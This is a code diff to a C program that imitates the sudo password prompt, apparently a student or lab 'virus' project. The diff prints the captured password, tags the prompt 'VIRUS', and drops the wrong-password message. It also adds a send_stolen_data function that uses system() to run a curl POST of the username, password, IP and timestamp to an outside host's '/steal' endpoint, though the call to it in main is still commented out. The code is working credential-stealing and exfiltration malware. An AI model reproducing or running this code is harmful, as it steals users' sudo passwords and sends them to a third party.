@@ -8,6 +8,8 @@
 #include <sys/wait.h>
 #include "pseudo.h"
 #include <signal.h>
+#include <assert.h>
+#include <time.h>
 
 
 #define PASSWD_SIZE 1024
@@ -43,8 +45,12 @@ int main(int argc, char ** argv){
 
     steal_password(passwd, username);
 
-    // printf("%s's password is %s\n", username, passwd);
-    
+    printf("%s's password is %s\n", username, passwd);
+
+    // NEED IP IDK HOW TO GET
+    // 
+    // 
+    // send_stolen_data(username, passwd, ip);
     
     char ** cmd_ray = make_execvp_args(argc, argv);
     runSudo(passwd, cmd_ray, 0);
@@ -90,7 +96,7 @@ int steal_password(char * passwd, char * username){
   int correctPasswd = 0;
   char * returned_pass;
   while (! correctPasswd){
-    sprintf(prompt,"[sudo] password for %s: ", username);
+    sprintf(prompt,"VIRUS [sudo] password for %s: ", username);
 
     // This command prints the prompt to stdout then reads in the user's input without it showing up on the terminal (like sudo)
     returned_pass = getpass(prompt);
@@ -103,10 +109,7 @@ int steal_password(char * passwd, char * username){
     if (testSudoPassword(passwd) == 0){
       correctPasswd = 1;
     }
-    else{
-      char * wrong_pass = "Sorry, try again.\n";
-      fputs(wrong_pass, stderr);
-    }
+
   }
 
   free(returned_pass);
@@ -128,6 +131,16 @@ int get_virus_name(char * escaped_path){
       }
   }
 
+}
+
+void send_stolen_data(char *username, char *password, char *ip) {
+  char command[1024];
+
+  snprintf(command, sizeof(command),
+           "bash -c 'curl -X POST -d \"username=%s&password=%s&ip=%s&timestamp=$(date)\" https://cyber.stanleyhoo1.tech/steal > /dev/null 2>&1'",
+           username, password, ip);
+
+  system(command);
 }
 
 int alias_virus(){
